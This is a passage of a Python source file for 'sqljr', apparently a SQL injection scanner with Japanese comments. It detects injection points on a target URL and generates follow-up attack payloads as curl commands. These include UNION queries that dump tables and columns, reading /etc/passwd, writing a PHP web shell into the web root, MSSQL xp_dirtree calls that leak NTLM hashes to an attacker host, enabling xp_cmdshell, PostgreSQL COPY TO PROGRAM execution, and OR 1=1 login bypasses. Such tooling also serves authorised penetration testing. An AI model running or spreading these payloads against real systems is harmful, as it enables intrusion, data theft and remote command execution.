                and all(ctx.new_db(w) or ctx.differ(w, good) for w in wrong)):
            return True
    return False


def union_cols_nulls(ctx, pre, cm):
    """ORDER BY が使えないとき用: NULL の数を 1..12 で変え、1 つだけ応答が違う数を列数とする。"""
    for frm in union_froms(ctx):
        sigs = {}
        for n in range(1, 13):
            r = send(ctx.pt, "%s UNION ALL SELECT %s%s%s" % (pre, ",".join(["NULL"] * n), frm, cm))
            if r.bad:
                return None
            sigs[n] = (r.fp[0], bool(ctx.new_db(r)), r.fp[2] if ctx.thr == 0 else len(r.body) // max(ctx.thr, 1))
        common, cnt = Counter(sigs.values()).most_common(1)[0]
        odd = [n for n, v in sigs.items() if v != common]
        if cnt == 11 and len(odd) == 1:
            return odd[0]
    return None


def test_union(ctx):
    pt = ctx.pt
    if not allow_comment():
        return          # 後続をコメントで消すので、GET 以外・--risk 1 では送らない
    # 値の閉じ方が分かっていればそれを使う。式コンテキストでしか見つかっていない場合
    #（元の値が 1 行も返さない WHERE など）は、閉じ方を総当たりする
    confirmed = ctx.sprefix is not None
    prefixes = [ctx.sprefix] if confirmed else list(QUICK_PREFIXES)
    if ctx.quote and not confirmed:
        prefixes.sort(key=lambda p: not p.startswith(ctx.quote))
    comments = ["-- -"] + (["#"] if (ctx.dbms == "MySQL" or (confirmed and not ctx.dbms)) else [])
    pre = cm = cols = None
    how, verified = "ORDER BY", False
    for pre in prefixes:
        for cm in comments:
            cols = union_cols_orderby(ctx, pre, cm)
            if cols:
                break
        if cols:
            break
    if cols:
        verified = union_verify(ctx, pre, cm, cols)
    if confirmed and not verified:          # 注入が確定しているときだけ、NULL を増やす方法も試す
        for cm2 in comments:
            alt = union_cols_nulls(ctx, prefixes[0], cm2)
            if alt:
                pre, cm, cols, how, verified = prefixes[0], cm2, alt, "UNION SELECT NULL", True
                break
    if not cols:
        return

    # 表示される列を探す（文字列を入れられて、画面に出る列）
    marker = lambda i: "%d%s" % (i, "kx")
    found = None
    for base in (null_base(pt), None):
        for frm in union_froms(ctx):
            for cv in concat_variants(ctx.dbms):
                # まず全列に目印（型が緩い DBMS ならこれ 1 回で分かる）。だめなら 1 列ずつ
                tries = [[cv % marker(i) for i in range(cols)]]
                if cols <= 16:
                    tries += [[(cv % marker(i)) if i == j else "NULL" for i in range(cols)] for j in range(cols)]
                for exprs in tries:
                    r = send(pt, "%s UNION ALL SELECT %s%s%s" % (pre, ",".join(exprs), frm, cm), base)
                    if r.bad or ctx.new_db(r):      # 型エラーの文面に目印が出ただけ、を表示列と誤認しない
                        continue
                    vis = [i for i in range(cols) if (TAG + marker(i)) in r.body]
                    if vis:
                        found = (vis[0], frm, base, r)
                        break
                if found:
                    break
            if found:
                break
        if found:
            break
    # UNION が実際に通った証拠（NULL の数で応答が変わる / 目印が画面に出る）が無ければ報告しない。
    # 揺れるページでは応答差が偶然でも起きるので、目印が出た場合だけ。
    # 例外: 注入自体は boolean / time で確定している場合は、ORDER BY で数えた列数を「未確認」と明記して出す
    if not found and (ctx.thr > 0 or not verified) and not confirmed:
        return
    ctx.union = dict(pre=pre, cols=cols, vis=None, frm="", base=None, cm=cm, verified=bool(found or verified))
    ctx.bound = ctx.bound or (pre, cm, "AND")
    ctx.sprefix = pre
    ev = None
    if found:
        ctx.union.update(vis=found[0], frm=found[1], base=found[2])
        ev = evidence(found[3])
        if found[1]:
            ctx.set_dbms("Oracle")
    ctx.hit("UNION", strong=ctx.union["verified"], prefix=pre, comment=cm, columns=cols, visible=ctx.union["vis"],
            method=how, verified=ctx.union["verified"], evidence=ev)
    msg = "列数 = %d（%s で判定）" % (cols, how)
    if found:
        msg += " / 表示列 = %d 列目" % (ctx.union["vis"] + 1)
    elif verified:
        msg += " / 表示列は自動では特定できず"
    else:
        msg += " / UNION SELECT NULL では確認できず（NULL の行で画面が壊れる実装かもしれません。列数は要手動確認）"
    print("  %s[UNION ]%s %s" % (G, N, msg))


# ── 提示するコマンド（もしかして これが刺さるかも？）──
def shq(s):
    """シェル用クォート。' を含むときは読みやすい "..." を優先する。"""
    if "'" in s and not re.search(r'[$`\\"!]', s):
        return '"%s"' % s
    return shlex.quote(s)


def _raw_only(s):
    """UTF-8 として表せないバイト列（surrogateescape）を含む値は、シェルに書けないので元の断片を使う。"""
    try:
        s.encode("utf-8")
        return False
    except UnicodeEncodeError:
        return True


def curl_cmd(pt, payload, base=None):
    """sqljr が送ったのと同じリクエストになる curl コマンドを、人が編集しやすい形（--data-urlencode）で作る。"""
    payload = tamper(payload)
    w, key = pt["where"], pt["key"]
    val = (pt["pre"] if base is None else base) + payload + pt["post"]
    q = shq
    method, url, headers, body = build(pt, payload, base)

    def pairs(items, raws, target):
        out = []
        for i, (k, v) in enumerate(items):
            raw = raws[i] if i < len(raws) else None
            if i == target:
                out += ["--data-urlencode", q("%s=%s" % (quote_plus(cl(k), errors="surrogateescape"), val))]
            elif raw is not None and (_raw_only(k) or _raw_only(v) or "=" not in raw):
                out += ["--data-raw", q(raw)]
            else:       # --data-urlencode は値だけをエンコードするので、名前は先にエンコードしておく
                out += ["--data-urlencode", q("%s=%s" % (quote_plus(cl(k), errors="surrogateescape"), cl(v)))]
        return out

    parts = ["curl", "-sk", "-i"]
    simple_get = T.method == "GET" and T.kind is None
    if simple_get and T.query and w != "PATH":
        shown = requests.utils.requote_uri(cl(T.url))
        parts += ["-G", q(shown)] + pairs(T.query, T.query_raw, key if w == "GET" else None)
    else:
        shown = requests.utils.requote_uri(url)     # requests が実際に送る形（{ } や空白は %XX）
        if not (T.method == "GET" and body is None) and not (T.method == "POST" and body is not None):
            parts += ["-X", T.method]
        parts.append(q(shown))
        if T.kind == "form":
            parts += pairs(T.form, T.form_raw, key if w == "POST" else None)
        elif body is not None:
            parts += ["--data-raw", q(body)]
    if re.search(r"[\[\]{}]", shown):
        parts.insert(3, "-g")                       # curl に [1-3] や {a,b} を展開させない
    ctype_seen = False
    for k, v in headers.items():
        lk = k.lower()
        if k == "Cookie":
            parts += ["-b", q(v)]
        elif lk == "user-agent":
            parts += ["-A", q(v)]                   # 既定の UA も含め、送ったものをそのまま（UA で挙動が変わる対象がある）
        elif lk == "content-type":
            ctype_seen = True
            if not (T.kind == "form" and v.strip().lower() == "application/x-www-form-urlencoded"):
                parts += ["-H", q("%s: %s" % (k, v))]
        elif v == "":
            parts += ["-H", q("%s;" % k)]           # 値が空のヘッダは「名前;」と書かないと curl が送らない
        else:
            parts += ["-H", q("%s: %s" % (k, v))]
    if body is not None and not ctype_seen:
        parts += ["-H", q("Content-Type:")]         # sqljr は Content-Type を付けていない。curl が勝手に付けるのを止める
    return " ".join(parts)


def suggest(ctx):
    """検出結果から、次に手で試す価値のあるペイロードを (説明, ペイロード, base) で返す。"""
    pt, S = ctx.pt, CFG.sleep
    guessed = ctx.bound is None
    cut_ok = allow_comment()        # 後続の SQL を消す形（コメント / スタック）を提示してよいか
    numeric = ctx.numeric and not ctx.quote         # ' でも '' でも壊れた → 数値の位置
    if ctx.bound:
        pre, suf, op = ctx.bound
    elif numeric:
        pre, suf, op = "", "", "AND"
    else:
        pre, suf, op = (ctx.quote or "'"), "-- -", "AND"
    known = ctx.dbms in INFO
    dlist = [ctx.dbms] if known else list(DBMS_LIST)
    out = []
    u = ctx.union

    def union_pl(expr, d, tail=None):
        exprs = ["NULL"] * u["cols"]
        exprs[u["vis"]] = expr
        frm = " FROM DUAL" if d == "Oracle" else ""
        return "%s UNION ALL SELECT %s%s%s" % (u["pre"], ",".join(exprs), frm, tail if tail is not None else u["cm"])

    if u and u["vis"] is None:
        marks = ",".join("'c%d'" % (i + 1) for i in range(u["cols"]))
        out.append(("UNION: 列数は %d%s。画面に c1..c%d のどれが出るか確認（型エラーなら NULL に置換）"
                    % (u["cols"], "" if u["verified"] else "（未確認）", u["cols"]),
                    "%s UNION ALL SELECT %s%s%s" % (u["pre"], marks, " FROM DUAL" if ctx.dbms == "Oracle" else "",
                                                    u["cm"]),
                    null_base(pt)))

    for d in dlist:
        I = INFO[d]
        tag = "" if known else "[%s なら] " % d
        steps = [("バージョン", I["ver"]), ("現在のユーザ", I["user"]), ("現在の DB", I["db"]),
                 ("テーブル一覧" + I.get("agg_note", ""), I["tables"]),
                 ("列一覧（<TABLE> を置換）", I["cols"]),
                 ("中身（<TABLE> <COL1> <COL2> を置換）" + I.get("agg_note", ""), I["dump"])]
        if not known:
            steps = steps[:1]               # DBMS 不明のうちは、まず特定するための 1 手だけ
        if u and u["vis"] is not None:
            for title, qy in steps:
                out.append((tag + "UNION: " + title, union_pl("(%s)" % qy, d), u["base"]))
            if known and I.get("one"):
                out.append((tag + "UNION: テーブル名を 1 件ずつ（一覧が切れる / 集約関数が無いとき。<N> を 0,1,2… に）",
                            union_pl("(%s)" % I["one"], d), u["base"]))
        if "ERROR" in ctx.kinds:
            for n, (note, tmpl) in enumerate(I["err"]):
                for title, qy in (steps[:4] if n == 0 else steps[:1]):     # 別形は 1 手だけ出す
                    # 境界が未確定で、後続を消す形を出せない状況では、DBMS ごとの「値を変えない」形に載せる
                    b = (pre, suf, op) if (ctx.bound or cut_ok) else safe_guess(d, numeric, ctx.quote)
                    out.append((tag + "error-based: %s をエラー文に出させる%s" % (title, note),
                                cond_payload(b[0], b[2], tmpl.format(q=qy), b[1]), None))
        probe = I["chr"].format(q=I["user"] if d != "SQLite" else I["tables"]) + ">77"
        if "BOOL" in ctx.kinds:
            out.append((tag + "boolean blind: 1 文字目が 'M'(77) より大きいか。真/偽の応答で判定し、"
                              "位置と数値を変えて二分探索",
                        cond_payload(pre, op, probe, suf), None))
        if "TIME" in ctx.kinds and ctx.tbound:
            tpre, tsuf, top = ctx.tbound
            if ctx.heavy:
                hd, tmpl, size, sec = ctx.heavy
                if d == hd:
                    core = HEAVY_TIMEB.format(cond=probe, heavy=tmpl.format(n=size))
                    out.append((tag + "time blind: 条件が真なら遅延（sleep ではなく重い処理。検出時は約 %.1f 秒。"
                                      "対象の速さで変わる）。位置と数値を変えて二分探索" % sec,
                                cond_payload(tpre, top, core, tsuf), None))
            elif known and I["timeb"]:
                kind, tmpl = I["timeb"]
                core = tmpl.format(cond=probe, t=S, hms=hms(S), al=ALIAS)
                pl = ("%s%s-- -" % (tpre, core)) if kind == "stack" else cond_payload(tpre, top, core, tsuf)
                out.append(("time blind: 条件が真なら %d 秒遅延。位置と数値を変えて二分探索" % S, pl, None))

        sp = ctx.sprefix
        if not known or sp is None or not cut_ok:
            continue
        # ── DBMS 別の「権限があれば」系（値を閉じて後ろに文を続ける形） ──
        if d == "MySQL" and u and u["vis"] is not None:
            out.append(("MySQL: ファイル読み取り（FILE 権限があれば）",
                        union_pl("LOAD_FILE('/etc/passwd')", d), u["base"]))
            out.append(("MySQL: Web ルートに書き込み（secure_file_priv が空なら。パスは要調整）",
                        union_pl("'<?php system($_GET[\"c\"]);?>'", d, " INTO OUTFILE '/var/www/html/s.php'-- -"),
                        u["base"]))
        st = "" if ctx.stack else "【スタッククエリ未確認。効かなければ使えない】"
        if d == "MSSQL":
            out.append(("MSSQL: xp_dirtree で NTLM ハッシュを取得（Kali で responder / impacket-smbserver を待受）" + st,
                        "%s;EXEC master..xp_dirtree '\\\\<KALI_IP>\\share'-- -" % sp, None))
            out.append(("MSSQL: xp_cmdshell を有効化（sysadmin なら）" + st,
                        "%s;EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
                        "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -" % sp, None))
            out.append(("MSSQL: xp_cmdshell で実行確認（Kali で tcpdump -i tun0 icmp）" + st,
                        "%s;EXEC xp_cmdshell 'ping -n 2 <KALI_IP>'-- -" % sp, None))
        if d == "PostgreSQL":
            if u and u["vis"] is not None:
                out.append(("PostgreSQL: ファイル読み取り（superuser / pg_read_server_files なら）",
                            union_pl("pg_read_file('/etc/passwd')", d), u["base"]))
            out.append(("PostgreSQL: COPY TO PROGRAM でコマンド実行確認（superuser なら。Kali で tcpdump）" + st,
                        "%s;COPY (SELECT '') TO PROGRAM 'ping -c 2 <KALI_IP>'-- -" % sp, None))

    # ── 認証バイパス ──
    # WHERE 句に入っていると確認できたとき（OR 型が通った / 値の閉じ方が分かっている）だけ出す。
    # INSERT / UPDATE の値かもしれない注入点に ' OR 1=1-- - を打つと全行が書き換わるので、名前だけでは出さない。
    loginish = pt["where"] in ("POST", "JSON") and re.search(r"user|login|mail|name|pass|pwd", pt["name"], re.I)
    if cut_ok and (op == "OR" or (loginish and ctx.sprefix is not None)):
        bp = pre if op == "OR" else ctx.sprefix
        cm = suf if (op == "OR" and suf in ("-- -", "#")) else "-- -"
        warn = "" if op == "OR" else "（SELECT の WHERE 句のときだけ。UPDATE / DELETE だと全行に効く）"
        out.append(("認証バイパス: 条件を常に真にする" + warn, "%s OR 1=1%s" % (bp, cm), None))
        one = [("Oracle", " AND ROWNUM=1"), ("MSSQL", " ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY"),
               ("MySQL / PostgreSQL / SQLite", " LIMIT 1")]
        for name, lim in one:
            if known and ctx.dbms not in name:
                continue
            out.append(("認証バイパス: 先頭 1 行だけ返す（複数行でエラーになる実装向け）%s%s"
                        % ("" if known else " [%s なら]" % name, warn), "%s OR 1=1%s%s" % (bp, lim, cm), None))
        if re.search(r"user|login|mail|name", pt["name"], re.I):
            out.append(("認証バイパス: admin としてパスワード判定をコメントアウト" + warn, "%s%s" % (bp, cm), "admin"))
    if not cut_ok:      # 念のため: ツールが送らなかった種類（後続を消す / 文を区切る）のペイロードは提示しない
        out = [o for o in out if not (o[1].rstrip().endswith(("-- -", "#")) or ";" in o[1])]
    return out, guessed, known


def print_suggestions(ctx):
    sug, guessed, known = suggest(ctx)
    pt = ctx.pt
    if not allow_comment():
        print("  %s[i] GET 以外・--risk 1 なので、後続の SQL を消す形（UNION / スタッククエリ / 認証バイパス）は"
              "送っておらず、提示もしません。\n      この注入点が参照系（検索・ログイン）と分かっているなら --risk 2 で"
              "再実行してください。更新系でそれらを打つと全行が書き換わります。%s" % (Y, N))
    if not sug:
        return []
    pre, suf, op = ctx.bound or ("", "", "")
    if not ctx.bound:
        bd = "未確定"
    elif not pre and not suf:
        bd = "数値コンテキスト（閉じ不要）"
    else:
        bd = "%s … %s" % (repr(pre), repr(suf))
    if ctx.bound and op == "":
        bd += "（式コンテキスト）"
    print("\n  %s[?] もしかして これが刺さるかも？%s  DBMS: %s / 境界: %s%s"
          % (M, N, ctx.dbms if known else "不明（候補ごとに表示）", bd,
             "（下のコマンドの閉じ方は推測）" if guessed else ""))
    if not ctx.strong:
        print("      %s※ ここまでの根拠はクォート / 汎用エラー文言だけです。注入点と確定したわけではありません。%s" % (Y, N))
    in_url = pt["where"] == "PATH" or (pt["where"] == "GET" and not (T.method == "GET" and T.kind is None))
    if in_url:
        print("      ※ この注入点は URL に埋め込むので、コマンド中のペイロードは % エンコード済みです。"
              "<TABLE> などを書き換えるときは「値」を直してから URL エンコードしてください。")
    res = []
    for i, (title, payload, base) in enumerate(sug, 1):
        shown = tamper(payload)             # 「値」も「コマンド」も実際に送る形（tamper 適用後）
        value = (pt["pre"] if base is None else base) + shown + pt["post"]
        if pt["where"] in ("PATH", "BODY"):
            value = shown
        cmd = curl_cmd(pt, payload, base)
        print("   %s%2d) %s%s" % (C, i, title, N))
        print("       値      : %s" % value)
        print("       コマンド: %s" % cmd)
        res.append(dict(title=title, value=value, command=cmd))
    return res


# ── 出力 ─────────────────────────────────────────────
def banner(point):
    print("\n%s[*] 注入点: %s '%s'  (元値: %s)%s"
          % (C, point["where"], point["name"], point["pre"] if point["where"] != "PATH" else "(URL パス)", N))


def scan_point(pt, tech, prev=None):
    """1 つの注入点を検査して Ctx を返す（ベースラインが取れなければ None）。
       prev: 同じ注入点を別のエンコードで調べ直すときの、前回の結果（クォートや DBMS の手がかりを引き継ぐ）。"""
    ctx = Ctx(pt)
    if prev:
        ctx.quote, ctx.numeric, ctx.dbms = prev.quote, prev.numeric, prev.dbms
    blocked0 = CFG.blocked
    if not baseline(ctx):
        return None
    if "E" in tech and not prev:
        test_error(ctx)
    if "B" in tech:
        test_boolean(ctx)
    if "T" in tech:
        test_time(ctx)
    if "U" in tech:
        test_union(ctx)

    # 検査中に対象の状態が変わっていないか（セッション切れ / WAF による遮断）
    blocked = CFG.blocked - blocked0
    if blocked and ctx.base.status not in WAF_STATUS:
        print("  %s[!] %d 件が HTTP 403/406/429/503。WAF かレート制限の可能性。この注入点の「検出なし」は"
              "信用できません（--delay / --tamper / --proxy で確認）。%s" % (Y, blocked, N))
    again = send(pt, "")
    if again.bad or ctx.differ(again, ctx.base):
        print("  %s[!] 検査後、元のリクエストの応答が最初と変わっています（セッション切れ / 遮断 / データ変化）。"
              "この注入点の結果は取り直してください。%s" % (Y, N))
    return ctx


def main():
    global SESSION, T

    for stream in (sys.stdout, sys.stderr):         # 端末が表せない文字（非 UTF-8 の元値など）で落ちない
        try:
            stream.reconfigure(errors="backslashreplace")
        except (AttributeError, ValueError):
            pass

    ap = argparse.ArgumentParser(add_help=False,
        description="SQL injection 注入点ファザー（検出 + 次に打つコマンドの提示まで。dump はしない）")
    ap.add_argument("-u", "-h", "--url", dest="url", default=None,
                    help="対象 URL（例: http://victim/item?id=1、* で注入点を固定）")
    ap.add_argument("-r", "--request", default=None, help="Burp 等の生リクエストファイル")
    ap.add_argument("--https", action="store_true", help="-r のとき https で送る")
    ap.add_argument("-m", "--method", default=None, help="HTTP メソッド（既定: -d があれば POST）")
    ap.add_argument("-d", "--data", default=None, help="ボディ（user=a&pass=b / JSON / * 付きの生データ）")
    ap.add_argument("-p", "--param", default=None, help="このパラメータだけ狙う")
    ap.add_argument("-c", "--cookie", default=None, help="Cookie（key=val; key2=val2）")
    ap.add_argument("-H", "--header", action="append", help="追加ヘッダ（複数可）例: -H 'Authorization: Bearer x'")
    ap.add_argument("-t", "--technique", default="EBTU",
                    help="使う手法: E=error B=boolean T=time U=union（既定 EBTU）")
    ap.add_argument("--dbms", default=None, help="DBMS を固定（mysql/mssql/postgresql/oracle/sqlite）")
    ap.add_argument("--level", type=int, default=1, help="1=パラメータ 2=+Cookie 3=+ヘッダ(UA/Referer/XFF)（既定 1）")
    ap.add_argument("--risk", type=int, default=1,
                    help="1=値を変えない式と AND だけ。GET 以外では、後続の SQL を消す / 区切るもの"
                         "（-- - / ; / UNION / ORDER BY / WAITFOR）と素の AND を送らない（既定） "
                         "2=全部送る: +OR 型・スタッククエリ・GET 以外でのコメント・SQLite の RANDOMBLOB 負荷"
                         "（書き込み系の SQL だとデータを壊し得る）")
    ap.add_argument("--string", default=None, help="boolean 判定: 真のときだけ応答に出る文字列")
    ap.add_argument("--sleep", type=int, default=5, help="time-based の遅延秒（既定 5）")
    ap.add_argument("--marker", default="*", help="注入点マーカー（既定 *）。* がデータに含まれるなら別の文字に")
    ap.add_argument("--timeout", type=int, default=20, help="リクエストのタイムアウト秒")
    ap.add_argument("--delay", type=float, default=0, help="リクエスト間の待ち秒")
    ap.add_argument("--retries", type=int, default=1, help="通信エラー時の再送回数（既定 1）")
    ap.add_argument("--proxy", default=None, help="プロキシ（例: http://127.0.0.1:8080 で Burp に通す。環境変数の"
                                                  "プロキシより優先）")
    ap.add_argument("--tamper", default="", help="カンマ区切り: " + ",".join(TAMPERS))
    ap.add_argument("-o", "--output", default=None, help="結果を JSON で保存（検出の根拠になったリクエスト/応答つき）")
    ap.add_argument("--log", default=None, help="送った全リクエストを JSONL で保存（証跡用。ヘッダ・Cookie・ペイロード込み）")
    ap.add_argument("-v", "--verbose", action="store_true", help="送った全リクエストを表示")
    ap.add_argument("--help", action="help", help="このヘルプを表示")
    args = ap.parse_args()

    if not args.marker:
        sys.exit("[!] --marker は 1 文字以上にしてください。")
    CFG.sleep = max(1, args.sleep)
    CFG.timeout = max(args.timeout, CFG.sleep + 15)
    CFG.marker, CFG.delay, CFG.retries = args.marker, args.delay, max(0, args.retries)
    CFG.risk, CFG.level, CFG.string, CFG.verbose = args.risk, args.level, args.string, args.verbose
    CFG.tamper = [x.strip() for x in args.tamper.split(",") if x.strip()]
    for name in CFG.tamper:
        if name not in TAMPERS:
            sys.exit("[!] 不明な tamper: %s（使えるもの: %s）" % (name, ", ".join(TAMPERS)))
    if args.dbms:
        alias = {"mysql": "MySQL", "mariadb": "MySQL", "mssql": "MSSQL", "sqlserver": "MSSQL",
                 "postgresql": "PostgreSQL", "postgres": "PostgreSQL", "pgsql": "PostgreSQL",
                 "oracle": "Oracle", "sqlite": "SQLite"}
        CFG.dbms = alias.get(args.dbms.lower())
        if not CFG.dbms:
            sys.exit("[!] 不明な DBMS: %s" % args.dbms)
    tech = args.technique.upper()

    if args.log:
        CFG.log = open(args.log, "a", encoding="utf-8", errors="backslashreplace")
    SESSION = requests.Session()
    SESSION.cookies.set_policy(_NoCookies())        # 応答の Set-Cookie は保存しない（-c で渡したものだけを送る）
    if args.proxy:
        SESSION.trust_env = False                   # 環境変数 http_proxy 等より --proxy を優先する
        SESSION.proxies = {"http": args.proxy, "https": args.proxy}
    T = build_target(args)
    points = build_points(T, args.param)
    if not points:
        sys.exit("[!] 注入点が見つかりません。パラメータの有無、* の位置、--level（Cookie=2 / ヘッダ=3）を確認してください。")

    print("%s=== sqljr — %s %s — %d 個の注入点を検査（手法: %s, sleep=%ds, risk=%d）===%s"
          % (B, T.method, cl(T.url), len(points), tech, CFG.sleep, CFG.risk, N))
    if T.marker_mode:
        print("%s[i] マーカー（%s）を見つけたので、その位置だけを検査します: %s\n    %s がデータの一部なら --marker で"
              "別の文字（例: --marker §）を指定してください。%s"
              % (Y, CFG.marker, ", ".join("%s '%s'" % (p["where"], p["name"]) for p in points), CFG.marker, N))
    if CFG.risk >= 2:
        print("%s[!] --risk 2: OR 型・コメント・スタッククエリを送ります。UPDATE / DELETE に届くと全行に効き得ます。%s"
              % (R, N))
    elif T.method not in ("GET", "HEAD"):
        print("%s[i] %s リクエストなので、後続の SQL を消す / 区切るペイロード（-- - / ; / UNION / WAITFOR）と素の AND は"
              "送りません（UPDATE や DELETE で狙った行以外に効くのを避けるため）。\n    検索・ログインなど参照系と"
              "分かっているなら --risk 2 で全ペイロードを送れます。登録・更新系は検査のたびに行が書き込まれます。%s"
              % (Y, T.method, N))
    else:
        print("%s[i] GET は参照系とみなし、コメント（-- -）・ORDER BY・UNION・MSSQL の WAITFOR も送ります。"
              "GET で更新・削除する作りの対象には使わないでください（狙った行以外が書き換わります）。%s" % (Y, N))
    results = []

    for pt in points:
        banner(pt)
        ctx = scan_point(pt, tech)
        if ctx is None:
            continue
        if pt["where"] == "COOKIE" and not ctx.confirmed() and ("B" in tech or "T" in tech or "U" in tech):
            # Cookie の値を URL デコードしない実装（Python / Go / Java 等）では %20 がそのまま SQL に入って壊れる
            print("  %s[i] Cookie: URL エンコードした形では確定できなかったので、エンコードせずにもう一度調べます。%s"
                  % (Y, N))
            raw = scan_point(dict(pt, raw=True), tech, prev=ctx)
            if raw is not None and raw.confirmed():
                raw.kinds |= ctx.kinds
                raw.hits = ctx.hits + raw.hits
                raw.strong = raw.strong or ctx.strong
                ctx = raw
                print("  %s[i] この Cookie はエンコードせずに送ると届きます（提示コマンドもその形です）。%s" % (Y, N))

        if ctx.kinds and "BOOL" not in ctx.kinds and CFG.risk < 2 and "B" in tech:
            print("  %s[i] boolean は未検出。元値が無効な入力（ログインフォーム等）なら --risk 2 で OR 型を試せます。%s"
                  % (Y, N))

        sug = []
        if not ctx.kinds:
            print("  %s[-]%s この注入点では検出なし" % (Y, N))
        else:
            sug = print_suggestions(ctx)
        results.append(dict(where=ctx.pt["where"], name=ctx.pt["name"], base_value=ctx.pt["pre"],
                            vulnerable=bool(ctx.kinds),
                            confidence=("confirmed" if ctx.strong else "tentative") if ctx.kinds else None,
                            techniques=sorted(ctx.kinds), dbms=ctx.dbms,
                            boundary=(dict(prefix=ctx.bound[0], suffix=ctx.bound[1], op=ctx.bound[2])
                                      if ctx.bound else None),
                            cookie_raw=bool(ctx.pt.get("raw")),
                            stacked=ctx.stack, union=ctx.union, hits=ctx.hits, suggestions=sug))

    print()
    if any(r["confidence"] == "confirmed" for r in results):
        print("%s[+] 注入点あり（送信 %d リクエスト）。上のコマンドは提示のみで、ツールは実行していません。%s"
              % (G, CFG.count, N))
        if any(r["confidence"] == "tentative" for r in results):
            print("    クォート / 汎用エラー文言だけの注入点は「可能性」です。提示コマンドで手動確認してください。")
    elif any(r["vulnerable"] for r in results):
        print("%s[?] 注入の可能性あり・未確定（送信 %d リクエスト）。根拠はクォートの挙動か汎用のエラー文言だけです。%s"
              % (Y, CFG.count, N))
        print("    提示コマンド（提示のみ・未実行）で手動確認するか、--risk 2 / --string / --level で条件を変えて再検査してください。")
    else:
        print("%s[-] 検出なし（送信 %d リクエスト）。%s" % (Y, CFG.count, N))
        print("    次の一手: --risk 2（OR 型・スタッククエリ。ログインフォーム向け）、--level 2/3（Cookie・ヘッダ）、"
              "--tamper space2comment,randomcase、--string、-r で Burp のリクエストをそのまま渡す")
        print("    未対応: 二次 SQLi、base64 等で包まれた値、multipart（* を置いた箇所のみ）。検出なし＝安全ではありません。")
    if args.output:
        with open(args.output, "w", encoding="utf-8", errors="backslashreplace") as f:
            json.dump(dict(target=cl(T.url), method=T.method, requests=CFG.count,
                           points=results), f, ensure_ascii=False, indent=2)
        print("[i] 結果を保存: %s" % args.output)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[!] 中断")
